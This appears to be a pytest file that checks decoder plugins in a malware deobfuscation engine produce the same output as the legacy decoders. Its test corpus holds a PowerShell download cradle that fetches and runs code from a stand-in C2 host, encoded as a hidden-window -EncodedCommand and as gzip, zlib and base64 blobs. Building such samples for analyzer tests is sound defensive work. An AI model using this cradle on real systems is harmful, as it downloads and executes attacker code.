"""UAIE Phase 2 · Plugin ≡ Legacy CI Gate (R26 · frozen).

Every plugin's Capability MUST produce output that is byte-for-byte
identical to its wrapped legacy decoder for every corpus input.

Assertion matrix
────────────────────────────────────────────────────────────
   For each plugin (P) and each corpus input (C):

     legacy_out = P.wraps_legacy(C)
     plugin_out = P.capability.execute(Artifact(C))

     If legacy_out is None:
         plugin_out MUST emit NO child artifacts.
     Else:
         legacy_out == (text, meta)
         plugin_out.child_artifacts[0].payload.decode(utf-8-replace) == text
         plugin_out.notes["legacy_meta"] == meta

If ANY plugin drifts, CI fails — the migration is not R26-compliant
and Phase 3 (parallel-run graph diff) MUST NOT begin.

Additionally validates:
    · plugin metadata (name / version / wraps_legacy present)
    · plugins do not touch the queue (no orchestrator import)
    · plugins are stateless (no module-level mutable state)
    · plugins are registered in the Capability registry
    · shellcode_string_scan matches _shellcode_string_scan output

Run:  cd /app/backend && python -m pytest tests/test_plugins_match_legacy.py -v
"""
from __future__ import annotations

import ast
import base64
import gzip
import os
import sys
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

import pytest

sys.path.insert(0, "/app/backend")
os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "test_database")

from services.uaie.artifact  import make_artifact
from services.uaie           import plugins as _plugins_pkg
from services.uaie.capability import for_type

# Import the legacy module once — the plugins wrap symbols from here.
from services.die.preprocessor import recursive_decoder as _LEGACY


# ═════════════════════════════════════════════════════════════════════════
# Corpus — canonical multi-stage loader stages + edge cases.
# ═════════════════════════════════════════════════════════════════════════
def _b64(text: bytes) -> str:
    return base64.b64encode(text).decode("ascii")


def _utf16le_b64(pwsh: str) -> str:
    """Emit the exact shape ``powershell -EncodedCommand`` produces."""
    return base64.b64encode(pwsh.encode("utf-16-le")).decode("ascii")


def _gzip_b64(pwsh: str) -> str:
    """Emit a base64 blob whose bytes are GZip of ``pwsh``."""
    return base64.b64encode(gzip.compress(pwsh.encode("utf-8"))).decode("ascii")


_INNER_PS = "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))"
_INNER_B64_GZIP = _gzip_b64(_INNER_PS)

CORPUS: Dict[str, str] = {
    # PowerShell -EncodedCommand
    "ps_encoded_utf16le":  f"powershell.exe -NoP -W hidden -EncodedCommand {_utf16le_b64(_INNER_PS)}",
    "pwsh_encoded_utf16le": f"pwsh -e {_utf16le_b64(_INNER_PS)}",

    # [Convert]::FromBase64String / FromBase64String
    "convert_from_b64": f'''$b = [System.Convert]::FromBase64String("{_INNER_B64_GZIP}"); iex $b''',
    "bare_frombase64":  f'''FromBase64String("{_b64(b"harmless payload for test parity")}"); ''',

    # Bare long base64
    "bare_long_b64":    _b64(b"a" * 200),   # 268 chars — passes 120 min-len

    # Non-decodable text (must return None everywhere)
    "plaintext_only":   "This is a completely benign paragraph with no encoded content whatsoever.",
    "short_b64":        _b64(b"short"),     # < 120 chars — legacy rejects

    # @@RAWBYTES@@ sentinel + gzip magic (produced by prior decode layers)
    "gzip_via_sentinel": (
        "prefix @@RAWBYTES@@"
        + gzip.compress(_INNER_PS.encode("utf-8")).hex()
        + " suffix"
    ),

    # @@RAWBYTES@@ sentinel + zlib magic
    "zlib_via_sentinel": (
        "prefix @@RAWBYTES@@"
        + __import__("zlib").compress(_INNER_PS.encode("utf-8")).hex()
        + " suffix"
    ),
}


# ═════════════════════════════════════════════════════════════════════════
# Plugin discovery
# ═════════════════════════════════════════════════════════════════════════
PLUGINS = _plugins_pkg.all_plugins()


def _resolve_legacy(wraps: str) -> Optional[Callable[..., Any]]:
    """Resolve ``recursive_decoder.<symbol>`` to the actual callable."""
    if not wraps.startswith("recursive_decoder."):
        return None
    return getattr(_LEGACY, wraps.split(".", 1)[1], None)


# ═════════════════════════════════════════════════════════════════════════
# T1 · Every plugin has valid metadata.
# ═════════════════════════════════════════════════════════════════════════
def test_all_plugins_registered():
    """Six legacy decoders → six migrated plugins."""
    names = {p["name"] for p in PLUGINS}
    expected = {
        "base64.bare",
        "base64.from_base64_string",
        "powershell.encoded_command",
        "gzip.inflate",
        "zlib.inflate",
        "shellcode.string_scan",
    }
    assert expected.issubset(names), f"missing plugins: {expected - names}"


def test_plugin_metadata_shape():
    for p in PLUGINS:
        assert p["name"]
        assert p["version"]
        assert p["wraps_legacy"]
        assert hasattr(p["recognizer"], "recognize")
        assert hasattr(p["capability"], "execute")
        # R26 rule: plugins declare requires_artifact_type + requires_evidence
        assert isinstance(p["capability"].requires_artifact_type, list)
        assert isinstance(p["capability"].requires_evidence, list)


# ═════════════════════════════════════════════════════════════════════════
# T2 · Byte-for-byte equivalence with legacy (the core CI gate).
# ═════════════════════════════════════════════════════════════════════════
@pytest.mark.parametrize("corpus_id,corpus", list(CORPUS.items()))
@pytest.mark.parametrize("plugin", PLUGINS, ids=lambda p: p["name"])
def test_plugin_matches_legacy(plugin, corpus_id, corpus):
    """For every plugin × every corpus input, plugin output MUST be
    byte-identical to what the wrapped legacy decoder would produce."""
    legacy = _resolve_legacy(plugin["wraps_legacy"])
    assert legacy, f"cannot resolve legacy for {plugin['name']}"

    art = make_artifact(
        payload=corpus.encode("utf-8"),
        artifact_type="text",
        discovered_by="test_corpus",
    )

    # Shellcode plugin is special — it operates on RAW BYTES + emits
    # Evidence but NO child artifacts (terminal decoder).
    if plugin["name"] == "shellcode.string_scan":
        # Legacy takes bytes. For corpora with @@RAWBYTES@@, unwrap
        # via the extractor; else pass the raw utf-8-encoded bytes.
        hit = _LEGACY._extract_rawbytes(corpus)
        legacy_bytes = hit[0] if hit else corpus.encode("utf-8")
        legacy_out = list(legacy(legacy_bytes))

        plugin_out = plugin["capability"].execute(art)
        plugin_findings = [
            f"{e.meta.get('legacy_tag')}"
            for e in plugin_out.evidence
        ]
        # Legacy returns the raw string list; plugin's meta.legacy_tag
        # matches each entry exactly.
        assert plugin_findings == legacy_out, (
            f"[{plugin['name']}/{corpus_id}] shellcode findings drift:"
            f" plugin={plugin_findings!r} vs legacy={legacy_out!r}"
        )
        return

    legacy_out = legacy(corpus)
    plugin_out = plugin["capability"].execute(art)

    if legacy_out is None:
        # Legacy said "cannot decode" — plugin MUST emit no children.
        assert not plugin_out.child_artifacts, (
            f"[{plugin['name']}/{corpus_id}] plugin produced children when "
            f"legacy said None: {[c.artifact_type for c in plugin_out.child_artifacts]}"
        )
        assert not plugin_out.evidence, (
            f"[{plugin['name']}/{corpus_id}] plugin emitted evidence when "
            f"legacy said None"
        )
        return

    # Legacy hit — plugin must produce EXACTLY one child whose text
    # equals the legacy output text, and notes.legacy_meta must equal
    # the legacy meta dict.
    assert len(plugin_out.child_artifacts) == 1, (
        f"[{plugin['name']}/{corpus_id}] expected 1 child, got "
        f"{len(plugin_out.child_artifacts)}"
    )
    child = plugin_out.child_artifacts[0]
    plugin_text = child.payload.decode("utf-8", errors="replace")
    legacy_text, legacy_meta = legacy_out
    assert plugin_text == legacy_text, (
        f"[{plugin['name']}/{corpus_id}] TEXT DRIFT:\n"
        f"  plugin: {plugin_text[:200]!r}\n"
        f"  legacy: {legacy_text[:200]!r}"
    )
    assert plugin_out.notes.get("legacy_meta") == legacy_meta, (
        f"[{plugin['name']}/{corpus_id}] META DRIFT:\n"
        f"  plugin: {plugin_out.notes.get('legacy_meta')!r}\n"
        f"  legacy: {legacy_meta!r}"
    )


# ═════════════════════════════════════════════════════════════════════════
# T3 · Every plugin is registered in the Capability registry.
# ═════════════════════════════════════════════════════════════════════════
def test_plugins_are_registered_in_capability_registry():
    for p in PLUGINS:
        # For each declared artifact_type, the capability must be resolvable.
        for t in (p["capability"].requires_artifact_type or ["*"]):
            caps = for_type(t)
            assert p["capability"] in caps, (
                f"[{p['name']}] capability not registered for type {t!r}"
            )


# ═════════════════════════════════════════════════════════════════════════
# T4 · R26 · Plugins never touch the orchestrator / queue.
# ═════════════════════════════════════════════════════════════════════════
def test_plugins_never_import_orchestrator():
    plugin_dir = Path("/app/backend/services/uaie/plugins")
    for path in plugin_dir.rglob("*.py"):
        src = path.read_text(encoding="utf-8")
        tree = ast.parse(src, filename=str(path))
        for node in ast.walk(tree):
            module = None
            if isinstance(node, ast.ImportFrom):
                module = node.module or ""
            elif isinstance(node, ast.Import):
                for a in node.names:
                    if "orchestrator" in (a.name or ""):
                        pytest.fail(
                            f"{path.name}: plugins MUST NOT import the "
                            f"orchestrator (R26 · plugins do not touch the "
                            f"queue).  Offender: {a.name}"
                        )
            if module and "orchestrator" in module:
                pytest.fail(
                    f"{path.name}: plugins MUST NOT import the orchestrator "
                    f"(R26 · plugins do not touch the queue).  "
                    f"Offender: {module}"
                )


# ═════════════════════════════════════════════════════════════════════════
# T5 · No Hidden State — plugins are stateless (module-level dicts /
# lists at write-time = 0, except the module-private ``_PLUGINS`` list
# in ``services.uaie.plugins.__init__``).
# ═════════════════════════════════════════════════════════════════════════
def test_plugins_have_no_hidden_state():
    """Two invocations of the same capability on the same artifact
    MUST produce identical Evidence + notes (proves purity)."""
    text = CORPUS["convert_from_b64"]
    art = make_artifact(
        payload=text.encode("utf-8"), artifact_type="text",
        discovered_by="stateless_test",
    )
    for p in PLUGINS:
        r1 = p["capability"].execute(art)
        r2 = p["capability"].execute(art)
        # Child text is deterministic.
        c1 = [c.payload for c in r1.child_artifacts]
        c2 = [c.payload for c in r2.child_artifacts]
        assert c1 == c2, f"[{p['name']}] non-deterministic children"
        # Notes are deterministic.
        assert r1.notes == r2.notes, f"[{p['name']}] non-deterministic notes"
